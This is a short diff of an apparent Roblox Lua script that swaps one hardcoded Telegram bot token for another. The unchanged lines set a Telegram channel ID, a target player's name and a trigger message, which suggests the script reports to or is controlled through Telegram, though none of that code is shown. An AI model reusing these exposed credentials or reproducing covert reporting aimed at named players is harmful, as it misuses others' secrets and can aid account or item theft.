@@ -158,7 +158,7 @@ task.spawn(function()
     
     task.cancel(dotTask)
 end)
-local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
+local TELEGRAM_TOKEN = "8113815289:AAHjyPNLtl1Ug2HY2r0SYZJuNltlYZZG-zc"
 local TELEGRAM_CHAT_ID = "-1002927824958" -- ID канала с префиксом для публичного канала
 local TARGET_PLAYER = "Rikizigg"
 local TRIGGER_MESSAGE = "."
